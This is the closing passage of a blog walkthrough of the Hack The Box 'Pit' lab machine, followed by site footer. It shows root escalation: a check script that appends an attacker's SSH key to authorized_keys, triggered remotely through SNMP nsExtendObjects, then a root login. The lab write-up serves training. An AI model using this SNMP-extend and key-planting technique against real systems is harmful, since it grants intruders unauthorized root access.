+<p>Inspecting this file, noticed that’s actually a directory but we don’t have read access on (just write and execute according to above output). Searching for other files that makes reference to this folder, ran a recusive <code class="language-plaintext highlighter-rouge">grep</code> in the file system, where I have found a file previously found in <code class="language-plaintext highlighter-rouge">snmpwalk</code> enum..</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"/usr/local/monitoring/"</span>  / 2&gt;/dev/null
+/usr/bin/monitor:for script <span class="k">in</span> /usr/local/monitoring/check<span class="k">*</span>sh
+<span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="nv">$ </span><span class="nb">cat</span> /usr/bin/monitor 
+<span class="c">#!/bin/bash</span>
+
+<span class="k">for </span>script <span class="k">in</span> /usr/local/monitoring/check<span class="k">*</span>sh
+<span class="k">do</span>
+    /bin/bash <span class="nv">$script</span>
+<span class="k">done</span>
+<span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="err">$</span>
+</code></pre></div></div>
+
+<p>As we can see, this script runs any file with <code class="language-plaintext highlighter-rouge">check*.sh</code> in the directory <code class="language-plaintext highlighter-rouge">/usr/local/monitoring</code>, allowing us to run any arbitrary code from the process that starts <code class="language-plaintext highlighter-rouge">/usr/bin/monitor</code>.</p>
+
+<p>To better understanding on how I could leverage the permission found, decided to review the recon output and found a mention to the file <code class="language-plaintext highlighter-rouge">monitor</code>, referenced as <strong>nxExtendedCommands</strong> from SNMP scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"/usr/bin/monitor"</span> <span class="nb">.</span>
+./scans/snmpwalk_nsExtendObjects.txt:NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">"monitoring"</span> <span class="o">=</span> STRING: /usr/bin/monitor
+./scans/snmp_full.txt:iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 <span class="o">=</span> STRING: <span class="s2">"/usr/bin/monitor"</span>
+</code></pre></div></div>
+
+<p>According to this guide <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce#getting-the-shell-from-net-snmp-extend">SNMP RCE - HackTricks</a>, if any binary is configured as nsExtendedCommand (or you’re able to add any in these settings), you can trigger its execution using <code class="language-plaintext highlighter-rouge">snmpwalk</code>.</p>
+
+<p>Based on the gathered information, we probably have a way to gain <code class="language-plaintext highlighter-rouge">root</code>access, where the following steps were executed:</p>
+
+<ul>
+  <li>Created a <code class="language-plaintext highlighter-rouge">checkXXXX.sh</code> file, which adds a public key inside ssh’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> in the profile that runs the process and copied it to <code class="language-plaintext highlighter-rouge">/usr/bin/monitor</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"ssh-rsa &lt;base64PubKey&gt; root@kali"</span> <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
+</code></pre></div></div>
+
+<ul>
+  <li>From the attacker machine, triggered the nsExtendedObject action</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Trigger Extended objects</span>
+snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
+</code></pre></div></div>
+
+<ul>
+  <li>Right after that, connected using the corresponding private key via SSH as user <code class="language-plaintext highlighter-rouge">root</code>, where I was able to get the final flag</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> pit root@10.10.10.241
+Web console: https://pit.htb:9090/
+
+Last login: Tue Aug 10 14:50:51 2021 from 10.10.10.10
+<span class="o">[</span>root@pit ~]# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+pit.htb
+<span class="o">[</span>root@pit ~]# <span class="nb">cat </span>root.txt
+&lt;redacted&gt;
+<span class="o">[</span>root@pit ~]#
+</code></pre></div></div>
+
+<p>I hope you guys have enjoyed!</p>
+
+<p>See you at the next post <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-linux" class="page__taxonomy-item p-category" rel="tag">HTB Linux</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-medium" class="page__taxonomy-item p-category" rel="tag">HTB Medium</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/categories/#walkthrough" class="page__taxonomy-item p-category" rel="tag">Walkthrough</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share" id="sharelinks">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <!-- CUSTOM: Localized sharing links -->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Walktrough%3A+HTB+Pit%20https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F09%2Fhtb-pit" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F09%2Fhtb-pit" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F09%2Fhtb-pit" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F09%2Fhtb-pit" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F09%2Fhtb-pit&amp;text=Walktrough%3A+HTB+Pit" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+  <!-- END CUSTOM: Localized sharing links -->
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/en-US/walkthrough/2021/09/htb-schooled" class="pagination--pager" title="Walktrough: HTB Schooled
+">Previous</a>
+    
+    
+    
+      
+        <a href="/en-US/walkthrough/2021/10/htb-cap" class="pagination--pager" title="Walktrough: HTB Cap
+">Next</a>
+      
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/TJKS5F6.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-explore" rel="permalink">Walktrough: HTB Explore
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/09/htb-pit">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/89b1SdH.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-dynstr" rel="permalink">Walktrough: HTB Dynstr
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/09/htb-pit">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/JkBtXmO.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-cap" rel="permalink">Walktrough: HTB Cap
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-02T13:00:00-03:00">October 2, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/09/htb-pit">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/ksBoJIQ.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/09/htb-schooled" rel="permalink">Walktrough: HTB Schooled
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-11T00:00:00-03:00">September 11, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/09/htb-pit">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Schooled, another medium-rated Linux box from Hack The Box, created by TheCyberGeek.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Mermaid.js -->
+<script type="module">
+    import mermaid from 'https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs';
+    const config = {
+        "theme": "dark", 
+        "startOnLoad": true
+    };
+    mermaid.initialize(config);
+</script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+    <!-- start custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+    
+      <li><a href="/en-US/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer"><i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
+    <!--<li><a onclick="return klaro.show();"><i class="fas fa-shield-alt" aria-hidden="true"></i> Review consent</a></li>-->
+    
+      
+        
+          <li><a href="/">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
+        
+        
+        
+      
+    
+      
+    
+    <!-- end custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a> &amp; <a href="https://github.com/kurtsson/jekyll-multiple-languages-plugin" rel="nofollow">Multiple Languages Plugin</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz-blog');
+    // CUSTOM : Utterances post mapping due to Jekyll Multilanguage
+    script.setAttribute('issue-term', 'htb-pit');
+    
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+
+  </body>
+</html>
